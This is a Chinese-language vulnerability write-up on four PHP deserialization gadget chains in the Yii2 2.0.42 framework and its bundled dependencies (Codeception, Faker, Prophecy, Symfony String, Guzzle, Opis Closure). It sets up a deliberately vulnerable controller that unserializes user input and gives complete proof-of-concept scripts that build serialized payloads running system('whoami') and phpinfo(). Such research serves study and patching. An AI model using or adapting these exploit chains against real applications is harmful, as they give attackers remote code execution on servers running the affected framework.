# 环境搭建

直接在github上面下载即可

https://github.com/yiisoft/yii2/releases/tag/2.0.42

composer create-project yiisoft/yii2-app-basic=2.0.42 yii2.0.42

在config/web.php修改如下代码

![image-20210929155838191](images/1.png)

创建一个TestController.php在controller文件夹下作为反序列化的入口

```
<?php

namespace app\controllers;

use Yii;
use yii\web\Controller;

class TestController extends Controller
{
    public function actionIndex(){
        $name = Yii::$app->request->get('test');
        return unserialize(base64_decode($name));    
    }

}
```

开启环境

![image-20210929230050885](images/2.png)



# 第一条链子

## 漏洞分析

定位__destruct到了\vendor\codeception\codeception\ext\RunProcess.php

![image-20210929153125188](images/3.png)

其他的wakeup方法大多都有一个wakeup方法,或者就是无法调用

跟进stopProcess()

```
public function stopProcess()
{
    foreach (array_reverse($this->processes) as $process) {
        /** @var $process Process  **/
        if (!$process->isRunning()) {
            continue;
        }
        $this->output->debug('[RunProcess] Stopping ' . $process->getCommandLine());
        $process->stop();
    }
    $this->processes = [];
}
```

这里会变量可控的`$this->processes`,那`$process`就可控

这样就可以去触发__call()方法

定位到vendor/fakerphp/faker/src/Faker/ValidGenerator.php

```
public function __call($name, $arguments)
    {
        $i = 0;

        do {
            $res = call_user_func_array([$this->generator, $name], $arguments);
            ++$i;

            if ($i > $this->maxRetries) {
                throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));
            }
        } while (!call_user_func($this->validator, $res));

        return $res;
    }
```

这里`$this->generator`可控,但是$name不可控,所以这里肯定没有办法进行RCE,不过可以去调用任意类的call方法,在我找这个call方法的时候找到了另外直接返回一个可控值的call方法

vendor/fakerphp/faker/src/Faker/DefaultGenerator.php

```
public function __call($method, $attributes)
    {
        return $this->default;
    }
}
```

这里的`$this->default`可控,那我完全可以自由控制`$res`的值

注意do-while循环也有一个call_user_func,并且`$this->validator`的值完全是可控的,而且我现在可以任意控制`$res`的值,那这里不就可以进行RCE了吗

## 漏洞复现

poc

```
<?php

namespace Codeception\Extension {

    use Faker\ValidGenerator;

    class RunProcess
    {
        private $processes = [];
        public function __construct()
        {
            $this->processes = ['T0WN' => new ValidGenerator()];
        }
    }
    echo base64_encode(serialize(new RunProcess()));
}

namespace Faker {
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct()
        {
            $this->generator = new DefaultGenerator();
            $this->validator = 'system';
            $this->maxRetries = '1';//防止抛出异常
        }
    }
    class DefaultGenerator
    {
        protected $default;
        public function __construct()
        {
            $this->default = 'whoami';
        }
    }
}

```

![image-20210929230754624](images/4.png)

# 第二条链子

## 漏洞分析

入口点不变,继续寻找可用的call方法

```
vendor\phpspec\prophecy\src\Prophecy\Prophecy\ObjectProphecy.php
```

```
public function __call($methodName, array $arguments)
    {
        $arguments = new ArgumentsWildcard($this->revealer->reveal($arguments));

        foreach ($this->getMethodProphecies($methodName) as $prophecy) {
            $argumentsWildcard = $prophecy->getArgumentsWildcard();
            $comparator = $this->comparatorFactory->getComparatorFor(
                $argumentsWildcard, $arguments
            );

            try {
                $comparator->assertEquals($argumentsWildcard, $arguments);
                return $prophecy;
            } catch (ComparisonFailure $failure) {}
        }

        return new MethodProphecy($this, $methodName, $arguments);
    }
```

`$this->revealer`可控,去寻找可控的reveal方法,这个类里面就有一个

![image-20211008220824229](images/5.png)

跟进getInstance

![image-20211008220853375](images/6.png)

跟进double

```
vendor/phpspec/prophecy/src/Prophecy/Doubler/Doubler.php
```

这里需要注意的是传入此处的 `$class` 和 `$interfaces`参数 必须是一个 `ReflectionClass` 类的对象 和对象数组,在后面写exp的时候要注意![image-20211008221241241](images/7.png)

到这里一切还是可控的

跟进createDoubleClass

![image-20211008222244380](images/8.png)

这里的`$name`和`$node`貌似不可控了,不过可以看看他是怎么来的

`$this->namer`和`$this->mirror`是可控的,那就可以用第一条链子找到的直接返回一个可控值的call方法开对`$name`和`$node`的值进行控制

继续跟进可用的create

![image-20211008222847176](images/9.png)

这里$code仍然用那个call方法对值进行控制,直接rce了

注意一下 这里 `$class` ， 需要 `Node\ClassNode` 类的对象，也就是当前命名空间`\Node\` 的`ClassNode` 

## 漏洞复现

exp

```
<?php

namespace Codeception\Extension {

    use Prophecy\Prophecy\ObjectProphecy;

    class  RunProcess
    {

        private $processes = [];
        public function __construct()
        {
            $a = new ObjectProphecy('1');
            $this->processes[] = new ObjectProphecy($a);
        }
    }
    echo base64_encode(serialize(new RunProcess()));
}

namespace Faker {
    class DefaultGenerator
    {
        protected $default;
        public function __construct($default)
        {
            $this->default = $default;
        }
    }
}

namespace Prophecy\Prophecy {

    use Prophecy\Doubler\LazyDouble;

    class ObjectProphecy
    {
        private $lazyDouble;
        private $revealer;
        public function __construct($a)
        {
            $this->revealer = $a;
            $this->lazyDouble = new LazyDouble();
        }
    }
}


namespace Prophecy\Doubler {

    use Faker\DefaultGenerator;
    use Prophecy\Doubler\Generator\ClassCreator;
    use Prophecy\Doubler\Generator\Node\ClassNode;

    class LazyDouble
    {
        private $doubler;
        private $class;
        private $arguments;
        private $double;
        private $interfaces;
        public function __construct()
        {
            $this->double = null;
            $this->arguments = null;
            $this->doubler = new Doubler();
            $this->class = new \ReflectionClass('Exception');
            $this->interfaces[] = new \ReflectionClass('Exception');
        }
    }
    class Doubler
    {
        private $mirror;
        private $creator;
        private $namer;
        public function __construct()
        {
            $a = new ClassNode();
            $this->mirror = new DefaultGenerator($a);
            $this->namer = new DefaultGenerator('TOWN');
            $this->creator = new ClassCreator();
        }
    }
}

namespace Prophecy\Doubler\Generator\Node {
    class ClassNode
    {
    }
}

namespace Prophecy\Doubler\Generator {

    use Faker\DefaultGenerator;

    class ClassCreator
    {
        private $generator;
        public function __construct()
        {
            $this->generator = new DefaultGenerator('system("whoami");phpinfo();');
        }
    }
}

```

这里执行命令的时候很奇怪,必须要加上phpinfo()才行,不然whoami的结果会被报错覆盖掉![image-20211010145211439](images/10.png)

之前都没有,不过这提醒了自己以后还是先用phpinfo试试能不能命令执行了,当没有回显的时候加上phpinfo说不定有用

# 第三条链子

## 漏洞分析

入口不变,寻找其他的call方法

```
vendor/fakerphp/faker/src/Faker/UniqueGenerator.php
```

```
public function __call($name, $arguments)
{
    if (!isset($this->uniques[$name])) {
        $this->uniques[$name] = [];
    }
    $i = 0;

    do {
        $res = call_user_func_array([$this->generator, $name], $arguments);
        ++$i;

        if ($i > $this->maxRetries) {
            throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a unique value', $this->maxRetries));
        }
    } while (array_key_exists(serialize($res), $this->uniques[$name]));
    $this->uniques[$name][serialize($res)] = null;

    return $res;
}
```

这里看着和第一条链子有些许的相似,但是循环条件不同,不能执行像第一条链子那样用循环条件里面的call_user_func去rce

不过$res还是用第一条链的方法可以控制的

循环语句有serialize方法,去找sleep函数、

```
vendor/symfony/string/LazyString.php
```

![image-20211010150345529](images/11.png)

跟进toString

![image-20211010150411529](images/12.png)

看到try里面的`return $this->value = ($this->value)();`

那这里的$this->value可控,我可以自定义一个闭包函数,而YII框架又是具有\Opis\Closure依赖的,那么就可以去序列化闭包函数，从而达到任意代码执行的目的

## 漏洞复现

```
<?php

namespace Codeception\Extension {

    use Faker\UniqueGenerator;

    class  RunProcess
    {

        private $processes = [];
        public function __construct()
        {
            $this->processes[] = new UniqueGenerator();
        }
    }
    echo base64_encode(serialize(new RunProcess()));
}

namespace Faker {

    use Faker\DefaultGenerator as FakerDefaultGenerator;
    use Symfony\Component\String\LazyString;

    class UniqueGenerator
    {
        protected $generator;
        public function __construct()
        {
            $this->generator = new DefaultGenerator();
        }
    }
    class DefaultGenerator
    {
        protected $default;
        public function __construct()
        {
            $this->default = new LazyString();
        }
    }
}

namespace Symfony\Component\String {
    class LazyString
    {
        private $value;
        public function __construct()
        {
            include("closure\autoload.php");
            $a = function () {
                phpinfo();
            };
            $a = \Opis\Closure\serialize($a);
            $b = unserialize($a);
            $this->value = $b;
        }
    }
}

```

这个脚本要放在vendor/opis目录下才能跑出来,不然没法包含closure\autoload.php

其实这条链子不是yii本身的问题,而且yii框架依赖的问题导致的rce

![image-20211010151715140](images/13.png)

# 第四条链子

## 漏洞分析

入口点还是不变,call方法可以利用之前找到的能直接返回一个可控值的那一个

然后可以将目标转到toString身上

```
vendor/guzzlehttp/psr7/src/AppendStream.php
```

![image-20211010152116472](images/14.png)

跟进rewind

![image-20211010152210733](images/15.png)

跟进seek

![image-20211010152225273](images/16.png)

$this->streams的值是可控的,那就可以去调用其他类的rewind方法

```
vendor/guzzlehttp/psr7/src/CachingStream.php
```

![image-20211010152754867](images/17.png)

一路跟进

在seek中又调用了read

![image-20211010152824604](images/18.png)

继续跟进

![image-20211010152840742](images/19.png)

这里又可以转向其他类的read函数

```
vendor/guzzlehttp/psr7/src/PumpStream.php
```

![image-20211010152916665](images/20.png)

跟进pump

![image-20211010152933402](images/21.png)

存在危险函数call_user_func

`$this->source`是可控的,不过`$length`刚才一路跟过来发现并不可控

不过和第三条链相似的,可以利用yii的依赖进行rce

## 漏洞复现

exp

```
<?php
namespace Codeception\Extension{
    use Faker\DefaultGenerator;
    use GuzzleHttp\Psr7\AppendStream;
    class  RunProcess{
        protected $output;
        private $processes = [];
        public function __construct(){
            $this->processes[]=new DefaultGenerator(new AppendStream());
            $this->output=new DefaultGenerator('TOWN');
        }
    }
    echo urlencode(serialize(new RunProcess()));
}

namespace Faker{
    class DefaultGenerator
{
    protected $default;

    public function __construct($default = null)
    {
        $this->default = $default;
}
}
}
namespace GuzzleHttp\Psr7{
    use Faker\DefaultGenerator;
    final class AppendStream{
        private $streams = [];
        private $seekable = true;
        public function __construct(){
            $this->streams[]=new CachingStream();
        }
    }
    final class CachingStream{
        private $remoteStream;
        public function __construct(){
            $this->remoteStream=new DefaultGenerator(false);
            $this->stream=new PumpStream();
        }
    }
    final class PumpStream{
        private $source;
        private $size=-10;
        private $buffer;
        public function __construct(){
            $this->buffer=new DefaultGenerator('T');
            include("closure/autoload.php");
            $a = function(){phpinfo();};
            $a = \Opis\Closure\serialize($a);
            $b = unserialize($a);
            $this->source=$b;
        }
    }
}
```

 参考链接

https://xz.aliyun.com/t/9948
